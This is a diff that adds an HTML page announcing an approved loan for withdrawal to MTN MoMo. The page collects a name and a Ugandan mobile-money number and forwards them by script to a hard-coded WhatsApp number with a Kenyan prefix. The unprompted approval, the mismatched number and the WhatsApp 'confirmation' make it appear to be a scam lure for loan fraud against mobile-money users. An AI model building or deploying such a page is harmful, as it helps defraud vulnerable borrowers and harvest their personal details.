@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Withdraw Loan to MoMo</title>
+<style>
+  body{font-family:Arial,sans-serif;background:#f2f5f9;margin:0;padding:15px}
+  .card{max-width:460px;margin:20px auto;background:white;border-radius:20px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.08)}
+  .top{background:#0A2E65;color:white;text-align:center;padding:30px 20px}
+  .top h2{margin:0;color:#FFCC00}
+  .body{padding:25px}
+  label{font-weight:bold;font-size:14px;display:block;margin-bottom:6px}
+  input,select{width:100%;padding:14px;border:1.5px solid #d0d7e2;border-radius:10px;font-size:15px;box-sizing:border-box}
+  .btn{width:100%;padding:15px;background:#0A2E65;color:white;border:none;border-radius:12px;font-weight:bold;font-size:16px;margin-top:18px;cursor:pointer}
+  .btn-whatsapp{background:#25D366}
+  .note{font-size:11px;color:#888;text-align:center;margin-top:12px;line-height:1.4}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="top">
+    <h2>Loan Approved</h2>
+    <p style="margin:8px 0 0">Withdraw to MTN MoMo</p>
+  </div>
+  <div class="body">
+    <label>Full Name</label>
+    <input id="name" placeholder="John Doe" style="margin-bottom:12px">
+
+    <label>MoMo Number to RECEIVE Your Loan</label>
+    <input id="momo" placeholder="+256 700 000 000" style="margin-bottom:12px">
+
+    <label>Loan Amount (UGX)</label>
+    <select id="amount">
+      <option>200,000</option>
+      <option>500,000</option>
+      <option>1,000,000</option>
+      <option>2,000,000</option>
+    </select>
+
+    <button class="btn" onclick="sendToWhatsApp()">WITHDRAW TO MY MOMO NOW</button>
+    
+    <p class="note">
+      We will never ask for your MoMo PIN.<br>
+      Thank you for your message. Your request will be processed as soon as possible.<br>
+      You will be redirected to WhatsApp for confirmation.
+    </p>
+  </div>
+</div>
+
+<script>
+function sendToWhatsApp(){
+  var name = document.getElementById('name').value || 'Applicant';
+  var momo = document.getElementById('momo').value || 'Not provided';
+  var amount = document.getElementById('amount').value;
+
+  if(momo.length < 9){
+    alert('Please enter your MoMo number to receive money');
+    return;
+  }
+
+  var message = `Hello, I have applied for a loan.%0A%0AName: ${encodeURIComponent(name)}%0AMoMo to RECEIVE: ${encodeURIComponent(momo)}%0AAmount: ${encodeURIComponent(amount)} UGX%0A%0AThank you for your message. Your request will be processed as soon as possible.`;
+  
+  var waNumber = "254723224995";
+  var url = `https://wa.me/${waNumber}?text=${message}`;
+  window.location.href = url;
+}
+</script>
+
+</body>
+</html>
